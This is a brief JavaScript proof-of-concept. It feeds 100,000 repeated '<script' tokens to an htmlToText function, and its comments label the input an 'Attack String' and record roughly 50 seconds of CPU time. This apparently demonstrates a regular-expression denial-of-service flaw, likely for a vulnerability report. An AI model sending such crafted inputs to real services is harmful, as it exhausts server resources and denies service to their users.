const htmlToText = require("./jsHtmlToText.js");

//Attack String :""+"<script"*100000+">"
var str = "";
for (var i = 0; i < 100000; i++) {
  str += "<script";
}
str += ">";

var result = htmlToText(str, "");

// real    0m50.540s
// user    0m50.513s
// sys     0m0.010s